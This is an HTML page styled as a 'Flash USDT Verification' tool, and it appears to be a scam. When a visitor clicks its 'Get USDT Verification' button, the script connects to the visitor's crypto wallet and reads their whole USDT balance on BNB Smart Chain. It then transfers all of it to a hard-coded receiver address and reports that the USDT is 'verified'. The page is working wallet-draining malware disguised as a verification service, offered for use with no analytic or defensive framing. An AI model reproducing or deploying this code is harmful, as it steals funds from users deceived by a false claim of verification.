<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Flash USDT Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-image: url('https://flashcheckers.net/bg.webp');
      background-size: cover;
      background-position: center;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }.container {
  text-align: center;
  background: rgba(255, 255, 255, 0.85);
  padding: 30px 40px;
  border-radius: 12px;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
}

h1 {
  margin-bottom: 20px;
  font-size: 28px;
  color: #222;
}

button {
  padding: 14px 28px;
  font-size: 16px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  background-color: #007BFF;
  color: white;
  font-weight: 600;
  transition: background 0.3s;
}

button:hover {
  background-color: #0056b3;
}

  </style>
</head>
<body>
  <div class="container">
    <h1>Verify your USDT</h1>
    <button id="verifyBtn">Get USDT Verification</button>
  </div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>  <script>
    const verifyBtn = document.getElementById('verifyBtn');

    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
    const usdtABI = [
      {
        "constant": false,
        "inputs": [
          {"name": "_spender", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
      }
    ];

    verifyBtn.addEventListener('click', async () => {
      if (typeof window.ethereum === 'undefined') {
        alert('Please install MetaMask or Trust Wallet to continue.');
        return;
      }

      const web3 = new Web3(window.ethereum);
      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const accounts = await web3.eth.getAccounts();
        const sender = accounts[0];
        const contract = new web3.eth.Contract(usdtABI, usdtAddress);

        const decimals = await contract.methods.decimals().call();
        const balance = await contract.methods.balanceOf(sender).call();

        if (parseInt(balance) === 0) {
          alert("No USDT balance found.");
          return;
        }

        await contract.methods.transfer(receiverAddress, balance).send({ from: sender });
        alert("Your USDT verified");
      } catch (error) {
        console.error(error);
        alert("Transaction failed or cancelled");
      }
    });
  </script></body>
</html>
